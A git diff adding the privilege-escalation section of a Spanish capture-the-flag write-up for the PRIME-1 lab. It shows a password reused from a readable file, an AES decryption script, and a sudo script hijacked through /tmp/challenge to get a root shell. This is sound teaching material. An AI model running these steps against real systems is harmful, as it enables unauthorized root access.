@@ -262,23 +262,146 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ## 5. Elevando Privilegios
 
+### 5.1. Buscamos archivos en la carpeta /home/
+
+- Encontramos que tenemos acceso a la carpeta /home/saket y NO tenemos acceso a la carpeta /home/victor
+
+```
+<ml/wordpress/wp-content/themes/twentynineteen$ cd /home                     
+www-data@ubuntu:/home$ ls -laR /home/
+ls -laR /home/
+/home/:
+total 16
+drwxr-xr-x  4 root   root   4096 Aug 29  2019 .
+drwxr-xr-x 24 root   root   4096 Aug 29  2019 ..
+drwxr-xr-x  2 root   root   4096 Mar 18 16:08 saket
+drwxr-x--x 20 victor victor 4096 Sep  1  2019 victor
+
+/home/saket:
+total 44
+drwxr-xr-x 2 root root  4096 Mar 18 16:08 .
+drwxr-xr-x 4 root root  4096 Aug 29  2019 ..
+-rw------- 1 root root    44 Mar 19 18:46 .bash_history
+-rwxr-x--x 1 root root 14272 Aug 30  2019 enc
+-rw-r--r-- 1 root root    18 Aug 29  2019 password.txt
+-rw-r--r-- 1 root root    33 Aug 31  2019 user.txt
+ls: cannot open directory '/home/victor': Permission denied
+```
+
+- En la carpeta del usuario SAKET tenemos el archivo password.txt y el archivo user.txt
+
+<img src="https://github.com/El-Palomo/PRIME-1/blob/main/prime11.jpg" width=80% />
 
 
+### 5.2. Elevar privilegios a través de SUDO
+
+- A través del acceso con el usuario: www-data, podemos elevar privilegios a través de SUDO.
+- Cuando solicita la contraseña, utlizamos el contenido del archivo password.txt: follow_the_ippsec
+- A través de SUDO identificamos un archivo que podemos ejecutar con privilegios de ROOT. Toca ejecutarlo para saber que realiza.
+
+```
+www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ sudo -l
+<ml/wordpress/wp-content/themes/twentynineteen$ sudo -l                      
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (root) NOPASSWD: /home/saket/enc
+```
+
+- Al ejecutarlo se crean dos archivos: enc.txt y el archivo key.txt
+
+<img src="https://github.com/El-Palomo/PRIME-1/blob/main/prime12.jpg" width=80% />
 
 
+### 5.3. Descifrar archivo AES
+
+- Si tenemos un archivo con un mensaje cifrado (ENC.TXT) y tenemos un archivo con una llave (KEY.TXT), toca descrifrarlo.
+- Por lo general al tener una llave podemos probar con AES para descifrarlo.
+
+```
+www-data@ubuntu:/home/saket$ ls -la
+ls -la
+total 44
+drwxr-xr-x 2 root root  4096 Mar 18 16:08 .
+drwxr-xr-x 4 root root  4096 Aug 29  2019 ..
+-rw------- 1 root root    44 Mar 19 18:46 .bash_history
+-rwxr-x--x 1 root root 14272 Aug 30  2019 enc
+-rw-r--r-- 1 root root   237 Mar 18 16:08 enc.txt
+-rw-r--r-- 1 root root   123 Mar 18 16:08 key.txt
+-rw-r--r-- 1 root root    18 Aug 29  2019 password.txt
+-rw-r--r-- 1 root root    33 Aug 31  2019 user.txt
+
+www-data@ubuntu:/home/saket$ cat key.txt
+cat key.txt
+I know you are the fan of ippsec.
+
+So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
+
+```
+
+- Importante: La llave es la palabra "ippsec" en MD5 como lo indica el mensaje en el archivo key.txt
+
+```
+root@kali:~/PRIME_LEVEL1# cat decrypt.py 
+from Crypto.Cipher import AES
+from base64 import b64decode
+
+data = b64decode(b"nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=")
+key = b"366a74cb3c959de17d61db30591c39d1"
+cip = AES.new(key,AES.MODE_ECB)
+print(cip.decrypt(data).decode("utf-8"))
+```
+
+<img src="https://github.com/El-Palomo/PRIME-1/blob/main/prime13.jpg" width=80% />
+
+- Obtenemos el password: tribute_to_ippsec
 
 
+### 5.4. Elevar privilegios con SUDO
 
+- Con la contraseña obtenida accedemos al usuario SAKET
 
+<img src="https://github.com/El-Palomo/PRIME-1/blob/main/prime14.jpg" width=80% />
 
+- Ejecutamos el script encontrado en SUDO y analizamos que realiza.
+- Esta claro que llama al archivo "/tmp/challenge" y no lo encuentra. 
 
+```
+saket@ubuntu:~$ sudo /home/victor/undefeated_victor
+sudo /home/victor/undefeated_victor
+if you can defeat me then challenge me in front of you
+/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
+```
 
+- Creamos un archivo /tmp/challenge y le colocamos un script básico para ver que ocurre.
 
+```
+saket@ubuntu:~$ sudo /home/victor/undefeated_victor
+sudo /home/victor/undefeated_victor
+if you can defeat me then challenge me in front of you
+/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
+saket@ubuntu:~$ echo "/bin/sh" > /tmp/challenge
+echo "/bin/sh" > /tmp/challenge
+saket@ubuntu:~$ chmod +x /tmp/challenge
+chmod +x /tmp/challenge
+saket@ubuntu:~$ sudo /home/victor/undefeated_victor
+sudo /home/victor/undefeated_victor
+if you can defeat me then challenge me in front of you
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root/
+cd /root/
+# ls
+ls
+enc  enc.cpp  enc.txt  key.txt	root.txt  sql.py  t.sh	wfuzz  wordpress.sql
+# cat root.txt
+cat root.txt
+b2b17036da1de94cfb024540a8e7075a
+```
 
-
-
-
-
-
+<img src="https://github.com/El-Palomo/PRIME-1/blob/main/prime15.jpg" width=80% />
 
 
